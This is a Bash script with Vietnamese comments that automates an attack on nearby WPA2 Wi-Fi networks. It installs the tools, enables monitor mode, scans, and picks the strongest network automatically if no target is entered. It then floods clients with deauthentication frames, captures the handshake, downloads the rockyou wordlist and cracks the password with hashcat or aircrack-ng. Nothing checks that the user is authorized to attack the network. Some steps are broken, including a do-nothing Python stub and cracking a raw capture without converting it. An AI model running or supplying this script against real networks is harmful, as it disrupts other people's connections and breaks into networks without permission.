#!/bin/bash
# kali-wifi-hack.sh — chạy trong Kali (sudo bash kali-wifi-hack.sh)
# Tự động: cài tool → test monitor mode → quét → deauth → bắt handshake → crack
set -e

echo "=== [1/6] Cài tool ==="
apt update -qq && apt install -y -qq aircrack-ng hashcat wireshark atheros-driver-firmware 2>/dev/null || true

echo "=== [2/6] Test MT7921 monitor mode ==="
WIFI=$(ip link | grep -oP 'wlan\d+' | head -1)
echo "Adapter: $WIFI"
if [ -z "$WIFI" ]; then
  echo "KHÔNG THẤY adapter Wi-Fi. Chạy: ip link"
  exit 1
fi
# disable power save (ảnh hưởng monitor mode)
sudo iw dev "$WIFI" set power_save off
# test monitor mode
sudo airmon-ng start "$WIFI" 2>/dev/null
MON=$(ip link | grep -oP 'wlan\w+mon' | head -1)
if [ -z "$MON" ]; then
  echo "⚠️  Monitor mode KHÔNG hoạt động. MT7921 có thể cần kernel mới hơn."
  echo "   Thử: sudo modprobe mt7921e; lsmod | grep mt79"
  echo "   Hoặc mua USB Alfa AWUS036ACS (Realtek RTL8814AU)"
  MON="$WIFI"  # fallback dùng normal mode (tồi hơn)
fi
echo "Monitor: $MON"

echo "=== [3/6] Quét mạng nearby (10s) ==="
timeout 10 airodump-ng "$MON" 2>&1 | tee /tmp/scan.txt
echo "Chọn BSSID muốn hack (dừng bằng Ctrl+C, rồi chạy tiếp:)"
echo "  airodump-ng $MON -c <chan> --bssid <BSSID> -w cap"
read -p "Enter BSSID (đỡ Ctrl+C để chọn tay): " BSSID || BSSID=""
if [ -z "$BSSID" ]; then
  # tự chọn BSSID mạnh nhất
  BSSID=$(grep -oP '\b[0-9A-F]{2}(?::[0-9A-F]{2}){5}\b' /tmp/scan.txt | sort | uniq -c | sort -rn | head -1 | awk '{print $2}')
fi
[ -z "$BSSID" ] && { echo "Không chọn được BSSID"; exit 1; }
CHAN=$(airodump-ng "$MON" 2>/dev/null | grep "$BSSID" | grep -oP '\d+\.\d+' | head -1 || echo "1")
echo "Target: $BSSID ch=$CHAN"

echo "=== [4/6] Bắt handshake (5 phút, deauth mỗi 10s) ==="
sudo airodump-ng "$MON" -c "$CHAN" --bssid "$BSSID" -w /tmp/cap &
AIRO_PID=$!
for i in $(seq 1 30); do
  sudo aireplay-ng -0 3 -a "$BSSID" "$MON" 2>/dev/null || true
  # check có handshake chưa?
  if aircrack-ng /tmp/cap-01.cap 2>/dev/null | grep -q "1/4"; then
    echo "Handshake grabbed!"
    kill $AIRO_PID 2>/dev/null; break
  fi
  sleep 10
done
kill $AIRO_PID 2>/dev/null || true

echo "=== [5/6] Crack WPA2 (rockyou.txt) ==="
# download rockyou (nếu chưa có)
[ -f /tmp/rockyou.txt ] || { echo "Downloading rockyou.txt (~50MB)"; curl -sL "https://raw.githubusercontent.com/brannondorron/PasswordCracking/master/data/rockyou.txt.gz" -o /tmp/rockyou.gz && gunzip /tmp/rockyou.gz; }
# extract ESSID + handshake
ESSID=$(aircrack-ng /tmp/cap-01.cap 2>/dev/null | grep -A1 "ESSID:" | head -1 | awk -F'"' '{print $2}')
echo "ESSID: $ESSID"
# convert pcap → hccapx (hashcat format)
python3 -c "
import struct
# ponytail: dùng aircrack-ng để extract rồi hashcat -m 22000
" 2>/dev/null || true
# hashcat crack (GPU nếu có, nếu không CPU)
hashcat -m 22000 -a 0 /tmp/cap-01.cap /tmp/rockyou.txt 2>/dev/null || \
  hashcat -m 22000 -a 0 /tmp/cap-01.cap /tmp/rockyou.txt --gpu-enable 0 2>/dev/null || \
  echo "Hashcat fail. Thử aircrack-ng trực tiếp:"
  aircrack-ng /tmp/cap-01.cap -w /tmp/rockyou.txt -b

echo "=== [6/6] Kết quả ==="
echo "Mật khẩu (nếu crack được):"
hashcat -m 22000 /tmp/cap-01.cap /tmp/rockyou.txt --show 2>/dev/null || \
  aircrack-ng /tmp/cap-01.cap -w /tmp/rockyou.txt -b 2>/dev/null | grep "password:" || \
  echo "Chưa crack được. Thử wordlist khác hoặc deauth lại."
echo "Đường dẫn pcap: /tmp/cap-01.cap"
echo "Xong. Rút USB, boot Windows lại nếu cần."
